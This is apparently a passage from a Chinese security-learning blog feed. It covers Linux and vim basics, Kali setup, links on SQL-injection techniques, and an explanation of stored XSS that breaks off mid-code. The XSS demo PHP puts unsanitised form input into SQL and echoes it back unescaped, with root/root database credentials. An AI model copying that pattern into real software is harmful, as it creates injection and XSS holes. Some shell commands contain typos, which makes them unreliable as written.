        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>废话不多说，冲冲冲<br>什么是shell呢？<br><img src="https://img-blog.csdnimg.cn/20200211113656866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看看这张图，早期是开机后直接面对黑黑的命令行，shell命令才能控制其他软件</p><p><strong>shell</strong> ：是为用户与机器之间搭建成的一个桥梁，让我们能够通过shell来对计算机进行操作和交互，从而达到让计算机为我们服务的目的。<br><img src="https://img-blog.csdnimg.cn/20200211145731715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>shell与终端的区别</strong><br><strong>终端</strong>：<em>接收用户的输入，并传递给shell程序，接收程序输出并展示到屏幕</em><br><strong>shell</strong>： <em>接收并解析用户的命令给操作系统执行，将结果输出到终端</em></p><h1 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h1><p>我们写文档的时候会通过编辑器来编辑文档<br>vim是kali linux自带的编辑器<br>vim的作用<br> 1.编写代码<br>2. 编写文档</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先使用touch命令，创建文件<br>touch  hello.txt</p><p><img src="https://img-blog.csdnimg.cn/20200211150048361.png" alt="在这里插入图片描述"><br>我们在进入文件，进行修改编辑文档，这就是vim的用处之一</p><p>使用 <code>vim hello.txt</code>就可以进入编辑了</p><h3 id="0x02进入文档，进行编辑"><a href="#0x02进入文档，进行编辑" class="headerlink" title="0x02进入文档，进行编辑"></a>0x02进入文档，进行编辑</h3><p><img src="https://img-blog.csdnimg.cn/2020021115023414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我输入 的话按个字母i<br><img src="https://img-blog.csdnimg.cn/20200211165725914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>会显示插入，这时候就可以书写了<br>然后我写入hello world文本<br><img src="https://img-blog.csdnimg.cn/20200211165326706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何保存退出嘞？<br>先按下键盘的右上角的Esc会像下图显示<br><img src="https://img-blog.csdnimg.cn/20200211165631237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="退出写入模式"><br>会退出写入模式<br>然后再按<code>shift</code> + <code>:</code> 号<br><img src="https://img-blog.csdnimg.cn/20200211165913383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候会显示一个 冒号，我们输入wq，就可以退出了<br><img src="https://img-blog.csdnimg.cn/20200211170003338.png" alt="在这里插入图片描述"><br>w：保存<br>q：退出<br>wq 和 x 都是保存退出<br>q！：强制退出<br>w！：强制保存，管理员才有权限<br>insert 键: 在键盘的回退键旁边，点 ins 可以直接切换到插入模式</p><p>单独写一个w，是保存，但不退出<br>单独写一个q，是退出，不保存<br>wq 和 x  都是保存退出<br>q！是强制退出，不会保存<br>w! 是强制保存，单不会退出<br>这样就看的懂吧<br><strong>下面是一些其他的方式</strong></p><pre class=" language-bash"><code class="language-bash">i：在当前光标所在字符的前面，转为输入模式I：在当前光标所在行的行首转换为输入模式a：在当前光标所在字符的后面，转为输入模式A：在光标所在行的行尾，转换为输入模式o：在当前光标所在行的下方，新建一行，并转为输入模式O：在当前光标所在行的上方，新建一行，并转为输入模式s：删除光标所在字符r：替换光标处字符</code></pre><p>查找<br>普通模式：　<br>/PATTERN：从当前位置向后查找<br>？PATTERN：从当前位置向前查找</p><p><img src="https://img-blog.csdnimg.cn/20200211170320351.png" alt="在这里插入图片描述"></p><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p><strong>1.echo命令</strong><br>echo命令用于在终端输出字符串或变量提取后的值<br>格式为 “echo [字符串 | $变量]”。<br><img src="https://img-blog.csdnimg.cn/20200211171241584.png" alt="具体设计shell编程，我不会"><br><strong>2.date命令</strong><br>date命令用于显示及设置系统的时间或日期，格式为“date [选项] [+指定的格式]”。<br><img src="https://img-blog.csdnimg.cn/20200211171117872.png" alt="在这里插入图片描述"></p><p><strong>3.poweroff命令</strong><br>poweroff 是条关机的命令，其格式为poweroff。</p><p><strong>4.top命令</strong><br>显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等，格式为“top [参数]”。</p><p>具体查看这篇博客<br><a href="https://www.cnblogs.com/niuben/p/12017242.html" target="_blank" rel="noopener">https://www.cnblogs.com/niuben/p/12017242.html</a></p><p><strong>5.ifconfig命令</strong></p><p>ifconfig命令用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备] [参数]”。<br><img src="https://img-blog.csdnimg.cn/20200211171734559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>6.uname命令</strong></p><p>uname命令用于查看系统内核与系统版本等信息，格式为“uname [-a]”。<br><img src="https://img-blog.csdnimg.cn/20200211171810608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>7.who命令</strong></p><p>who用于查看当前登入主机的用户终端信息，格式为“who [参数]”。<br>这个不用我说了吧，不懂后面加个 –help<br><img src="https://img-blog.csdnimg.cn/20200211171850317.png" alt="在这里插入图片描述"></p><p><strong>8.history命令</strong></p><p>history命令用于显示历史执行过的命令，格式为“history [-c]”。<br><img src="https://img-blog.csdnimg.cn/20200211171945336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>9.pwd命令</strong></p><p>pwd命令用于显示用户当前所处的工作目录，格式为“pwd [选项]”。<br>注意，linux大小写敏感，千万不要小写<br><img src="https://img-blog.csdnimg.cn/20200211172156677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>10.cd命令</strong></p><p>cd命令用于切换工作路径，格式为“cd [目录名称]”。<br>这个就不用我说了吧<br><img src="https://img-blog.csdnimg.cn/20200211172307300.png" alt="在这里插入图片描述"></p><p><strong>11.ls命令</strong></p><p>ls命令用于显示目录中的文件信息，格式为“ls [选项] [文件] ”。</p><p>依然是你懂的~~</p><h2 id="文末"><a href="#文末" class="headerlink" title="文末"></a>文末</h2><p>内容比较多，接下来我会继续补全，我讲的是常用命令<br>有说错的地方评论指出，我会改正。<br>欢迎大佬们捧场，感兴趣的可以加我vx互相交流<br><img src="https://img-blog.csdnimg.cn/20200211173014847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_1,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_1,color_FFFFFF,t_10" alt="在这里插入图片描述"><br>（另外：我不是打广告，只是互相交流，人多了我会创个群，方便一起交流）</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/031626401.html"/>
      <url>/2020/031626401.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>——————————————————————————————————————</p><p>这是我之前发布到的其他的一个网址，这里的话我重新总结</p><p>可能分很多，我也不是很清楚，只是皮毛的研究了一下</p><h2 id="1，sql按数据库分的话，常用的有："><a href="#1，sql按数据库分的话，常用的有：" class="headerlink" title="1，sql按数据库分的话，常用的有："></a>1，sql按数据库分的话，常用的有：</h2><p><strong>MySQL，access，oracle，ms sql</strong></p><h2 id="2，按传参类型，分"><a href="#2，按传参类型，分" class="headerlink" title="2，按传参类型，分"></a>2，按传参类型，分</h2><p>Get，Post，cookie</p><p>总而言之有：<br><code>盲注</code>       ：（盲注分布尔型，和时间型）<br><code>union注入</code>：（我叫他显错注入）<br><code>head注入</code> ： （在请求头注入）<br><code>Post注入</code>  ：（也就是对于表单的注入，例如登录框）</p><p>还有就是关于其他数据库的骚姿势，例如<strong>mysql</strong>的<strong>dnslog</strong>注入，<strong>mssql</strong>的反弹注入</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我也就废话不多说，写出来，这是我原本csdn写的，不想重复，就这样把对应地址贴出来</p><h4 id="Mysql数据库注入："><a href="#Mysql数据库注入：" class="headerlink" title="Mysql数据库注入："></a>Mysql数据库注入：</h4><p><code>1：union注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104343242" target="_blank" rel="noopener">点击查看</a></p><p><code>2：盲注：</code><br><a href="https://blog.csdn.net/m0_46304840/article/details/104640938" target="_blank" rel="noopener">布尔型</a><br><a href="https://blog.csdn.net/m0_46304840/article/details/104688966" target="_blank" rel="noopener">时间型</a><br><code>3：报错注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104733922" target="_blank" rel="noopener">点击查看</a><br><code>4：宽字节注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104758798" target="_blank" rel="noopener">点击查看</a><br><code>5：cookie注入&amp;base64注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104774792" target="_blank" rel="noopener">点击查看</a><br><code>6：head注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104805895" target="_blank" rel="noopener">xff头注入</a><br>————————————————————————————————————————</p><h4 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h4><p><code>偏移注入&amp;移位溢注&amp;逐字猜解：：</code></p><p><a href="https://blog.csdn.net/m0_46304840/article/details/104808825" target="_blank" rel="noopener">点击查看</a></p><h4 id="MS-SQL数据库注入"><a href="#MS-SQL数据库注入" class="headerlink" title="MS SQL数据库注入"></a>MS SQL数据库注入</h4><p><code>mssql-union注入：</code> <a href="https://blog.csdn.net/m0_46304840/article/details/104815241" target="_blank" rel="noopener">union注入</a><br><code>mssql-反弹注入</code>：<a href="https://blog.csdn.net/m0_46304840/article/details/104818304" target="_blank" rel="noopener">反弹注入</a></p><p>至于其他的还没写，以后直接更新到这里</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali的基本配置</title>
      <link href="/2020/031611755.html"/>
      <url>/2020/031611755.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-：vmware网络配置"><a href="#0x01-：vmware网络配置" class="headerlink" title="0x01 ：vmware网络配置"></a>0x01 ：vmware网络配置</h1><hr><p>在有下角有个网络适配器<br><img src="https://img-blog.csdnimg.cn/20200317004057207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>点击一下就出现了虚拟机设置<br><img src="https://img-blog.csdnimg.cn/20200317004201978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_5,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_14,color_FFFFFF,t_60" alt="在这里插入图片描述"><br>虚拟机有三个网络配置<br><code>1</code>：桥接模式（虚拟机和主机在同一个网络环境下的两台电脑）<br><code>2</code>：NAT模式（虚拟机通过主机联网）<br><code>3</code>：主机模式（只能虚拟机和主机直接交互）<br>前面2个应该比较熟悉，而第三个，意思就是无法ping通外网，只能虚拟机和宿主机直接互相ping通</p><h1 id="0x02：kali系统更新配置"><a href="#0x02：kali系统更新配置" class="headerlink" title="0x02：kali系统更新配置"></a>0x02：kali系统更新配置</h1><hr><p>更新配置这里使用老版本的，新版本的以后在弄（新版本msf依赖下载好慢，不习惯）</p><p>选择不更新 Metasploit<br><strong>1:</strong> 查看当前的系统中所有软件包状态</p><p><code>sudo dbjg --get-selections | more</code><br>这时候可以找打软件包为 “metasploit-framework”<br><strong>2:</strong> 给metasploit-framework锁定当前版本不更新</p><p><code>sudo apt-mark hold metasploit-framework</code><br><strong>3：</strong> 查看当前已锁定的软件包<br><code>sudo dbkg --get-selections | grep hold</code><br><strong>4:</strong> 取消软件保留设置</p><p><code>sudo -apt-mark unhold metasploit-framework</code><br>但是一般情况下的话不会去锁定哒<del>~</del></p><p><strong>kali系统更新后出现一些问题</strong><br>进入 <code>/usr/share/metasploit-framework</code> 目录下<br>使用命令</p><p><code>gem install bundler</code><br><code>gem update --system</code><br>然后就可以成功的启动了，具体可以问度娘的~~</p><h3 id="一、配置kali系统源"><a href="#一、配置kali系统源" class="headerlink" title="一、配置kali系统源"></a>一、配置kali系统源</h3><p><strong>1.</strong> 使用编辑器打开系统源文本<br><code>leafpad /etc/apt/aources.list</code></p><p><strong>2.</strong> 填写源</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span class="token comment" spellcheck="true">#阿里云</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment" spellcheck="true">#清华大学</span>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span class="token comment" spellcheck="true">#163</span>deb http://mirrors.163.com/debian wheezy main non-free contribdeb-src http://mirrors.163.com/debian wheezy main non-free contribdeb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contribdeb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contribdeb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib<span class="token comment" spellcheck="true">#东软大学</span>deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib<span class="token comment" spellcheck="true">#官方源</span>deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre><p>任意选一个就好了，可以选清华，或者中科大</p><p><strong>3.</strong> 使用更新命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> upgrade <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> dist-upgrade</code></pre><h1 id="0x03：kali配置ssh服务"><a href="#0x03：kali配置ssh服务" class="headerlink" title="0x03：kali配置ssh服务"></a>0x03：kali配置ssh服务</h1><ol><li>开启ss服务</li></ol><p><code>service ssh start</code><br>2. 查看ssh服务状态</p><p><code>service ssh status</code><br>3. 关闭ssh服务</p><p><code>service ssh stop</code><br>步骤：<br>先是打开ssh服务，然后ifconfig查看虚拟机ip<br><img src="https://img-blog.csdnimg.cn/20200317011416793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就可以填主机，协议要选ssh<br>名称随意<br><img src="https://img-blog.csdnimg.cn/20200317011558319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后会提示我们输入用户名，就是虚拟机用户名<br>root （我的是root）<br>填写完后会要求我们输入密码<br><img src="https://img-blog.csdnimg.cn/20200317011712365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入你自己虚拟机的密码既可<br>然后点击记住密码，下次就可以直接登录了<br><img src="https://img-blog.csdnimg.cn/20200317011804574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现这个标志就说明成功了。啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020版本kali安装</title>
      <link href="/2020/031665118.html"/>
      <url>/2020/031665118.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>——————————————————————————————————————<br>总所周知，这个最新版本的变化很大（其实就是桌面变化大）<br>其实嘞，物竞天择，随时代潮流。我刚好想试一试，那么就安装一个最新版本的，kali 2020.1</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><blockquote><p>我相信大家的电脑都是windows<br>所以，我就直接复制下载地址</p></blockquote><p><code>https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</code><br><img src="https://img-blog.csdnimg.cn/20200316195043515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt></p><blockquote><p>进入这个地址<br>因为我有梯子，所以就不管那么多，直接点击下载了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195117743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>下载了一局王者的世界，不要问我为什么（我打了一局王者，这个就下载好了）</p></blockquote><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><blockquote><p>下载后是个压缩包，这时候我们就解压。解压一下下就妥了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020031619513425.png" alt="在这里插入图片描述"></p><blockquote><p>我就解压到这里来，丝毫不慌~~</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195140262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>找到vmx后缀的这个，右键点击vm打开</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195149984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>就是第一个，可以直接免手工安装<br>打开后的初始账号密码是 kali | kali</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195304992.png" alt="在这里插入图片描述"></p><blockquote><p>进入界面一瞄，发现不赖<br><code>kali-undercover</code>  使用这个命令，可以切换主题</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195317209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>不行不行，我爱了</p><p>幸亏还是不一样的（这样以后还是可以在朋友面前装逼）<br>再使用那个命令，就可以再切换回来，这里只是像windows，但是实际上命令还是得使用linux的</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200316195448651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>好吧，这有点不符合常理 这样的话以后会懵逼的，我丢</p></blockquote><blockquote><p>这是进入的是非管理员权限。这时候就要  <code>sudo su</code> 切换到管理员权限，然后修改密码用 <code>sudo passwd root</code><br>设置成你想要的密码</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020031619560873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>参考文章：<a href="https://www.moonsec.com/archives/762" target="_blank" rel="noopener">https://www.moonsec.com/archives/762</a> 这时候换源</p></blockquote><p><code>sudo vim /etc/apt/sources.list</code></p><h4 id="解决中文乱码"><a href="#解决中文乱码" class="headerlink" title="解决中文乱码"></a>解决中文乱码</h4><p><code>dpkg-reconfigure locales</code><br>进入图形化界面之后，（空格是选择，Tab是切换，带*是选中），<br>选中zh_CN.UTF-8，确定后，将zh_CN.UTF-8选为默认。</p><p><code>apt-get install xfonts-intl-chinese</code>  和 <code>apt-get install ttf-wqy-microhei</code> 来安装中文字体<br>然后重启1遍，如果不可以的话。就重启2遍就可以了<br>具体的网上有，我就不多描述了</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反射性xss</title>
      <link href="/2020/031648744.html"/>
      <url>/2020/031648744.html</url>
      
        <content type="html"><![CDATA[<p>没啥好说的，直接贴出我之前写的：<a href="https://mp.csdn.net/console/editor/html/104876310" target="_blank" rel="noopener">反射型xss</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>存储型&amp;dom型</title>
      <link href="/2020/0316476.html"/>
      <url>/2020/0316476.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-存储型xss"><a href="#0x01-存储型xss" class="headerlink" title="0x01.存储型xss"></a>0x01.存储型xss</h1><hr><p><strong>1. 什么是存储型xss？</strong></p><blockquote><p>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。只要访问了这个页面的访客，都有可能会执行这段恶意脚本<br>（因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的）</p></blockquote><p><strong>2. 源码剖析</strong><br>这里直接贴出php源码</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gbk<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>存储型<span class="token constant">XSS</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        输入你的<span class="token constant">ID</span>：  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>        输入你的Name：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"insert into xss value ($id,'$name')"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span>        <span class="token keyword">echo</span> <span class="token string">"回显内容："</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from xss where id=1"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token 